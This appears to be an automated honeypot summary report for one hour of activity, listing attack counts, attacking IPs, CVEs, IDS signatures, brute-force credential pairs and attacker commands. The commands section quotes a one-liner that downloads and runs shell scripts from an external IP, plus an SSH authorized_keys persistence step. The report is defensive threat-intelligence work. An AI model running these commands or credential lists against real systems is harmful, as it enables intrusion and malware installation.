# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-10T17:01:25Z
**Timeframe:** 2025-10-10T16:20:01Z to 2025-10-10T17:00:01Z
**Files Used:**
- agg_log_20251010T162001Z.json
- agg_log_20251010T164001Z.json
- agg_log_20251010T170001Z.json

## Executive Summary
This report summarizes honeypot activity over the last hour, based on data from three log files. A total of 13,760 attacks were recorded across various honeypots. The most targeted services were SSH (Cowrie), various TCP/UDP ports (Honeytrap), and Cisco ASA emulation (Ciscoasa). The majority of attacks originated from IP addresses 114.96.104.77, 176.65.141.117, and 167.250.224.25. Attackers were observed attempting to exploit several vulnerabilities, with a focus on older CVEs. A significant number of commands were executed, primarily related to establishing persistent SSH access.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 6209
- Honeytrap: 2418
- Ciscoasa: 1780
- Suricata: 1661
- Mailoney: 872
- ElasticPot: 274
- Dionaea: 252
- Tanner: 95
- Adbhoney: 35
- Sentrypeer: 37
- ConPot: 25
- H0neytr4p: 27
- Redishoneypot: 23
- Ipphoney: 11
- Honeyaml: 8
- Heralding: 3
- ssh-rsa: 30

### Top Attacking IPs
- 114.96.104.77
- 176.65.141.117
- 167.250.224.25
- 88.210.63.16
- 187.140.13.155
- 14.142.165.66
- 138.204.127.54
- 107.189.29.175
- 102.88.137.80
- 218.0.56.78
- 113.31.103.179
- 209.141.57.124
- 185.39.19.40
- 188.166.169.185
- 103.149.253.166
- 161.248.189.80

### Top Targeted Ports/Protocols
- 22
- 25
- 9200
- 5903
- 3306
- 80
- 8333
- 5908
- 5909
- 5901
- UDP/161
- 23
- TCP/22
- 443
- 5060
- TCP/80
- 1111

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-1999-0517
- CVE-2024-4577 CVE-2024-4577
- CVE-2024-4577 CVE-2002-0953
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
- CVE-2021-42013 CVE-2021-42013

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd /data/local/tmp/; busybox wget http://72.60.156.235/w.sh; sh w.sh; curl http://72.60.156.235/c.sh; sh c.sh; wget http://72.60.156.235/wget.sh; sh wget.sh; curl http://72.60.156.235/wget.sh; sh wget.sh; busybox wget http://72.60.156.235/wget.sh; sh wget.sh; busybox curl http://72.60.156.235/wget.sh; sh wget.sh

### Signatures Triggered
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET HUNTING RDP Authentication Bypass Attempt
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 67
- GPL SNMP request udp
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET INFO curl User-Agent Outbound

### Users / Login Attempts
- root/
- 345gs5662d34/345gs5662d34
- admin/1qaz!QAZ
- postgres/1234
- mike/mike
- centos/p@ssword
- blank/123123
- user/user1234
- user/12345
- supervisor/supervisor2010

### Files Uploaded/Downloaded
- sh
- wget.sh;
- w.sh;
- c.sh;
- ns#
- )
- rdf-schema#
- types#
- core#
- XMLSchema#
- www.drupal.org)

### HTTP User-Agents
- Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36

### SSH Clients and Servers
- No SSH client or server information was found in the logs.

### Top Attacker AS Organizations
- No attacker AS organization information was found in the logs.

## Key Observations and Anomalies
- A high volume of attacks were logged in a short period, indicating automated scanning and exploitation attempts.
- The majority of commands executed post-exploitation are focused on reconnaissance and establishing persistence via SSH authorized_keys.
- Attackers are leveraging a mix of old and new CVEs, suggesting a broad-spectrum approach to find vulnerable systems.
- The presence of commands related to downloading and executing shell scripts from a remote server indicates attempts to install malware or backdoors.
- The "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication" signature indicates a serious exploitation attempt.
